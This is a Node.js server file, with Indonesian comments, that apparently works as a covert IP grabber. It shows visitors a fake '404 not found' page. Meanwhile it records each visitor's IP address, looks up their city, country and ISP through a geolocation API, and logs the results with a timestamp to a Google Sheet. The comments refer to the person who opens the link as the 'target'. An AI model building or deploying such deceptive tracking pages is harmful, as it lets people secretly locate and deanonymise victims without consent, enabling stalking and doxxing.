require('dotenv').config();
const http = require('http'); //library untuk web server
const {Configuration, IPGeolocation} = require('ip2location-io-nodejs');
const {google} = require('googleapis');

const config = new Configuration(process.env.API_ip2location);
const ip2location = new IPGeolocation(config);

const auth = new google.auth.GoogleAuth({
    credentials: {
        client_email: process.env.Google_sheet_email,
        private_key: process.env.Google_privatekey.replace(/\\n/g, '\n'),     
    },
    scopes: ['https://www.googleapis.com/auth/spreadsheets'],
});

const sheets = google.sheets({version: 'v4', auth});
const cariIP = (target)=> {
    return new Promise((resolve)=>
    {
        const timer = setTimeout(()=> resolve(null), 5000);
        ip2location.lookup(target, 'en', (err, data)=> {
            clearTimeout(timer);
            if(!err && data?.city_name) resolve(data);
            else resolve(null);
        });
    });
};

const printsheet = async (data)=> {
    await sheets.spreadsheets.values.append({
        spreadsheetId: process.env.SPREADSHEET_ID,
        range: 'Sheet1!A:D',
        valueInputOption: 'USER_ENTERED',
        requestBody: { values: [data]}, 
    });
};

const html = `
        <!DOCTYPE html>
        <html>
            <head>
                <title>404 not found</title>
                <style> 
                    body {
                        background-color: aliceblue;
                        font-family: Georgia, 'Times New Roman', Times, serif;
                        color :black;
                        display : flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        height : 100vh;
                        overflow : hidden;
                        margin : 0;
                    }
                
                    h1, p { 
                        margin : 0;
                        font-size: 2.5em;
                        padding : 2px 0;
                    }
                </style>
            </head>
            <body>
                <h1>404 not found</h1>
                <p>This page couldn't be found</p>
                <p>Check the link and try again</p>
            </body>
        </html>`;

const handler =  async(request, respond) => {

    const target = request.headers['x-forwarded-for']?.split(',')[0].trim() || request.socket.remoteAddress; 
    //ketika nanya nya target kena, dia bakalan reuqest dan kirim melalui socket(pipe) uyang hubungin program ini sama user
    /* kalau pake hosting gratis, pake x-forwaded biar ga kedetect local host, ibarat kayak perantara 
    bikin hosting send ke jembatan itu terus send ke catatant.txt
    */
    const time = new Date().toLocaleString('id-ID'); //inisialisasi nanti biar kita bisa cetak waktunya juga
    respond.writeHead(404, {'Content-Type': 'text/html'}); //respon masuk ke web html
    respond.end(html);
    try {
        const data = await cariIP(target);
        const kota = data ? `${data.city_name}, ${data.country_name}` : 'gagal melacak';
        const isp = data?.as || '-';
        await printsheet([time, target, kota, isp]);
        console.log(`Berhasil menyimpan log : ${target}`);
    } catch(e){
        console.error('Error:', e.message);
    }
};
module.exports = handler; //deploy server di serahin ke hosting -> saat ini vercel
if(require.main === module){ 
    const server = http.createServer(handler);
    /*biar bisa di jalanin secara lokal juga, 
    kalau dijalankan dengan vercel -> nilainya false kondisi tidak dijalankan
    kalau dijalankan seecara lokal -> nilainya true kondisi dijalankan*/
    server.listen(3000, () => { 
    console.log("Server nyala!");
    });
}